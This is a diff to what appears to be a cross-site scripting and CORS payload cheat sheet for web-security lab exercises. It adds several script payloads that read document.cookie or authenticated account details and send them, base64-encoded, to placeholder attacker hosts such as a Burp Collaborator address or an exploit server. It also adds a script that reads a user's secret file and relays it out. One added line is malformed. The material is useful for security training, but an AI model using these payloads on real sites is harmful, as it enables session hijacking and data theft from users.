@@ -117,6 +117,8 @@ http://foo?&apos;-alert(1)-&apos;
 
 <script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>
 
+<script>fetch(https://<BURP-COLLAB>/${btoa(document.cookie)}</script>
+
 <img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>
 
 <img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
@@ -184,11 +186,40 @@ function handleResponse() {
 </script>
 ```
 
- read /home/carlos/secret.txt
+ONE-LINERS
+```js
+// change accountDetails for the param required  
+<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('GET','https://<IP>/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));};</script>
+
+// --------------------- //
+
+<script>new XMLHttpRequest().withCredentials=true;void(req.onload=()=>location='https://<EXPLOIT-SV>/?d='+btoa(req.responseText));req.open('GET','https://<IP>/accountDetails');req.send()</script>
+
+// -------------------- //
+
+
+fetch('https://<IP>/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://<EXPLOIT-SV>/?d='+btoa(d))
+
+/ --------------------- //
+
+<script>document.location="https://<IP>/?<PARAM-XSS>=<ONE-LINER>"</script>
+
+example: <script>https://<IP>/?productId=<ONELINER></script>
+
+
+
+
+<script>
+    document.location="http://<subdomain.<IP>/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://<IP>.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SERVER>/log?key='%2b btoa(this.responseText) };%3c/script>&storeId=1"
+</script>
+
+```
+
+READ /home/carlos/secret
 ```js
 // XSS -> <script src="http://<IP>/exploit"></script>
 
-var domain ="http://<IP>/home/carlos/secret.txt"
+var domain ="http://<IP>/home/carlos/secret"
 var ourDomain = "http://<OUR-SERVER>/exploit"
 
 var req = new XMLHttpRequest();
